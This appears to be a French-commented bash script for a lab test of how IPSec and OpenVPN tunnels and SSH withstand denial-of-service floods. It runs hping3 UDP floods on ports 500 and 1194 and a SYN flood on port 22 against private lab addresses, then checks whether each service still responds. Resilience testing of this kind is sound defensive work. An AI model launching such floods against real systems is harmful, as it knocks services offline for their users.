#!/bin/bash
TARGET="192.168.138.10"
SSH_TARGET="192.168.230.137"
DURATION=10

# ─── Fonction de nettoyage iptables après chaque test ─────────
cleanup_iptables() {
    echo "[*] Nettoyage des règles iptables résiduelles..."
    sudo iptables -D INPUT -p udp --dport 500 -m limit --limit 100/sec --limit-burst 200 -j DROP 2>/dev/null || true
    sudo iptables -D INPUT -p udp --dport 4500 -m limit --limit 100/sec --limit-burst 200 -j DROP 2>/dev/null || true
    sudo iptables -D INPUT -p udp --dport 1194 -m limit --limit 100/sec --limit-burst 200 -j DROP 2>/dev/null || true
    sudo iptables -D INPUT -p tcp --dport 22 -m limit --limit 100/sec --limit-burst 200 -j DROP 2>/dev/null || true
    echo "[+] Nettoyage terminé"
}

# ─── Vérification de l état des tunnels VPN ───────────────────
check_vpn_status() {
    echo "[*] Vérification de l'état des tunnels VPN..."
    sudo ipsec status | grep -q "ESTABLISHED" \
        && echo "  [+] IPSec tunnel ACTIF" \
        || echo "  [!] IPSec tunnel HORS SERVICE"
    sudo ip addr show tun0 &>/dev/null \
        && echo "  [+] OpenVPN tunnel ACTIF" \
        || echo "  [!] OpenVPN tunnel HORS SERVICE"
}

# ─── Nettoyage au début pour partir d un état propre ──────────
cleanup_iptables

echo "========================================"
echo "TEST DE RÉSILIENCE AUX ATTAQUES DoS"
echo "Cible: $TARGET"
echo "Durée: ${DURATION}s par test"
echo "========================================"

# ─── Vérification avant les tests ─────────────────────────────
echo -e "\n[*] État des tunnels AVANT les tests:"
check_vpn_status

# ─── Test 1: UDP flood on IKE port 500 ────────────────────────
echo -e "\n[*] Test 1: UDP flood sur port 500 (IKE)"
timeout $DURATION sudo hping3 --udp -p 500 --flood $TARGET 2>&1 | tail -3
cleanup_iptables
sleep 2
echo "[*] Vérification que le VPN répond après l'attaque..."
sudo ike-scan --ikev2 --sport=0 $TARGET 2>&1 | grep -q "NO_PROPOSAL_CHOSEN\|handshake" \
    && echo "  [+] VPN est ACTIF !" \
    || echo "  [!] VPN est HORS SERVICE !!!!!"

# ─── Test 2: UDP flood on OpenVPN port 1194 ───────────────────
echo -e "\n[*] Test 2: UDP flood sur port 1194 (OpenVPN)"
timeout $DURATION sudo hping3 --udp -p 1194 --flood $TARGET 2>&1 | tail -3
cleanup_iptables
sleep 2
echo "[*] Vérification que OpenVPN répond après l'attaque..."
nc -zu -w3 $TARGET 1194 2>&1 \
    && echo "  [+] OpenVPN port est ACTIF !" \
    || echo "  [!] OpenVPN port HORS SERVICE !!!!!"

# ─── Test 3: SYN flood on SSH port 22 ─────────────────────────
echo -e "\n[*] Test 3: Attaque SYN flood sur le port 22 (SSH)"
timeout $DURATION sudo hping3 -S -p 22 --flood $TARGET 2>&1 | tail -3
cleanup_iptables
sleep 2
echo "[*] Vérification de l'accessibilité SSH..."
ssh -o ConnectTimeout=5 \
    -o StrictHostKeyChecking=no \
    -o PasswordAuthentication=no \
    -i /home/ubuntu/.ssh/ed25519 \
    ubuntu@$SSH_TARGET "echo '  [+] SSH est ACTIF !'" 2>/dev/null \
    || echo "  [!] SSH HORS SERVICE !!!!!"

# ─── Nettoyage final ──────────────────────────────────────────
cleanup_iptables

# ─── Vérification après les tests ─────────────────────────────
echo -e "\n[*] État des tunnels APRÈS les tests:"
check_vpn_status

echo -e "\n========================================"
echo "TEST DoS TERMINÉ"
echo "========================================"
